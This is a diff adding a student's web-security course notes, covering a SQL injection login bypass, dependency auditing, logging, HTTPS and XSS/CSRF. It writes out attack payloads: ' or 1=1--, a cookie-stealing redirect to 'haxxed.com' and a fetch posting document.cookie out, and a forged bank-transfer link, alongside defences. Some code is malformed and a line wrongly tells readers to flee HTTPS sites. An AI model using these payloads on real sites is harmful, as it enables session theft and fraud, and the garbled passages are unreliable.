@@ -82,17 +82,243 @@ Knex.js takes cares of the parametes.
 
 Exercise:#1-Injections
 
+Go ahead and try logging in with the following credentials:
+
+Email	user@email.com 
+Password	password
+
+Okay, so guessing the password didn't work. Let's try adding a quote character after the password:
+
+Email	user@email.com
+Password	password'
+
+Hmmm. The application crashed with an unexpected error. 
+What could that mean?
+
+The logs show a SQL syntax error. This indicates that the quote character messed something up in an unexpected way.
+
+...done.
+Initializing log display.
+Logging out of session.
+Rendering login page.
+Checking supplied authentication details for user@email.com.
+Finding user in database.
+No such user, report this to the user (invalid credentials?).
+
+This is what the application code looks like behind the scenes.
+
+SELECT *
+  FROM users
+  WHERE email = 'user@email.com'
+   AND pass  = 'password' LIMIT 1
+
+Enter the password password' and watch the code window.
+
+The quote is inserted directly into the SQL string, and terminates the query early. This is what caused the syntax error we saw in the logs.
+
+SELECT *
+  FROM users
+ WHERE email = 'user@email.com'
+   AND pass  = 'password'' LIMIT 1
+
+This behavior indicates that the application might be vulnerable to SQL INJECTION.
+
+Enter the following credentials and click "Log in":
+
+Email	user@email.com
+Password	' or 1=1--
+
+And we are in! We successfully gained access to the application without having to guess the password, using SQL INJECTION.
+
+LOGS
+
+password = 'password'' limit 1.
+Unable to login this user due to unexpected error.
+Rendering login page.
+Checking supplied authentication details for user@email.com.
+Finding user in database.
+Authentication details confirmed, establishing session for this user.
+
+CODE
+
+SELECT *
+  FROM users
+ WHERE email = 'user@email.com'
+   AND pass  = '' or 1=1--' LIMIT 1
+
+The -- characters you entered caused the database to ignore the rest of the SQL statement, allowing you to be authenticated without having to supply the real password.
+
 Exercise:#2-Security Files
+Front-End and Back-End files.
 
 3rd Party Libraries
+As our application grows we  depend on more third-party
+libraries.
+A ton of code of another people.
+We don't won't rewrite same code.
+Perhaps this may not be the most secure.
+Check the library.
+If i'am bad with one problem but it may collect information.
+You can trust React/Redux.
+Use packages that is well known.
+
+Two tools to check the libraries.
+
+-npm install -g nsp
+ nsp check # audit package.json
+
+-npm install -g snyk
+ snyk test # audit node_modules directory
+
+Sometimes you must use sudo command to install.
+We can run a program called nsp check.
+Bad people trying to find vulnerability.
+That's why you have many updates into your phone.
+nsp gives you information.
+
+The other tool.
+If we run
+snyk test.
+Login with the github account.
+snyk test is going to run many tests.
+Snyk is testing many dependencies.
+Careful about packages.
 
 Logging
+Another important topic.
+Logging can be right tricky.
+All about to gather information from users.
+How you use websites.
+Insuffcient Logging cupled with allows attackers 
+attack system.
+Time to detect a person has going into your system can take 120 days.
+So it is important to have good Logging.
+
+So we have these two tools.
+-npm install winston
+-npm install morgan
+It is a Https-request middleware.
+const morgan = require('morgan');
+We can use morgan as an middle-ware.
+app.use('morgan('tiny')').
+We can have others options besides tiny.
+After npm start
+We get this message OPTIONS / secret 200 4 - 3.760 ms.
+You see that is Options that is.
+We install a package called corse.
+npm install cors.
+const cors = require('corse').
+const morgan = require('morgan').
+app.use('cors()').
+We get this after cors POST/secret 200 9 - 3.194 ms
+app.use(morgan('combine')).
+You get more information after that.
+const winston = require('winston').
+Winston is a logger for just everything.
+With Winston you have power to do more things.
+With Winston you have to give it more inputs like
+winston.log('info',userInput).
+We can do some cool stuff with Winston
+winston.log('info','userInput' + userInput).
+winston.log('error','userInput' + userInput).
+We can go back with Winston and get some inputs user has done.
+You wanna log-information to get how it is working.
+You never want to log-in informations on the front-end because of events.
 
 HTTPS Everywhere
+Are called SSL/TLS Certificates.
+https://letsencrypt.org/
+Means when we send information from the client to the server someone can take the information.
+If some website is using https run away from that website.
+SSL/TLS creates an tunnel of https.
+This encrypts the information between the client and the server.
+You are gonna see https in any sort of forms.
+But there are ways you can misconfigure any things.
+One of the best sites is called Let's Encrypt.
+It will prevent the most.
+In the early days you had to buy many Let's Encrypt.
+SSL/TSL being backed by some companies.
+If you have any form on your website you have to use https.
+Cloudfare is really great works as Content.
+They help against DNS-attacks.
+Imagine we get millions of machines the server is not handle the request.
+Cloudfare DNS-attacks protections.
 
 XSS + CSRF
+Your going to start noticing that they are over-crossing.
+What is Cross-Site Scripting.
+Includes untruseted data whenever an application includes untrusted data in a new web page without proper validation.
+Cross-site scripting allows the hacker to execute code in the victims browser.
+Practical example.
+An blog-post with posts.
+I can run codes on different sites.
+'haxxed.com?cookie' + go to that website and document.cookie and send me that cookie.
+A cookie is something a websites remeber.
+And log-in to twitter.
+Change the location
+window.location = 'haxxed.com?cookie' + document.cookie
+window.location shows the location of the url.
+Sessions hajacking.
+
+Client
+Tunnel 1 
+Server
+Tunnel
+DataBase
+Tunnel 2
+3rd Party API
+
+We can use the cookies to access databases and servers.
+<a href="http://netbank.com/transfer.do?acct=AttackerA&amount;=$100">Read more!</a>
+This takes you to an bad website.
+XSS we are using some get-request.
+Aready used the coockies.
+I have made the users to click on a link to create bad things.
+Let's attack Twitter for example.
+fetch('//httpbin.org/post' ,{method: 'POST', body:document.coockie})
+It sends an request to a httpbin that is a http response and request server.
+What ever response we get.
+If we do this we get this error below.
+Refused to connect to https://httpbin.org/post because it violates the following Content Security Policy.
+We have to have it in the headers.
+We can do it by:
+app.get('/', (req,res) => {
+	res.set({'Content-Security-Policy': "script-src 'self' 'https://apis.google.com'"})
+});
+  res.send('Hello World!')
+});
+If we go to Network-tag and localhost we get Content Security Policy on the website.
+Simplify it we are automating this.
+
+To be secure with coockies we can use.
+
+app.get('/', (req,res) => {
+	res.cookie('session', '1', {httpOnly: true})
+	res.cookie('session', '1', {secure: true})
+	res.set({'Content-Security-Policy': "script-src 'self' 'https://apis.google.com'"})
+});
+  res.send('Hello World!')
+});
+
+If we go to the application we have the cockies.
+
+Summary
+Always validate your code with userinput.
+-Sanitize input
+-No eval()
+ Don't use this function.
+-No document.write()
+ document.write('<script>alert(1)</script>').
+ Let's you not to do this because of Content-Security-Policy.
+-Content Security Policy
+ Set the headers.
+-Secure + HTTPOnly Cookies
+ 
+ npm install csurf
 
 Exercise:#3- XSS + CSRF
+1. XSS
+Imagine you are the owner of breddit.com, the number one social media site for the baking industry. You have an avid community of commenters who love sharing their bread knowledge.
 
 Code Secrets
 
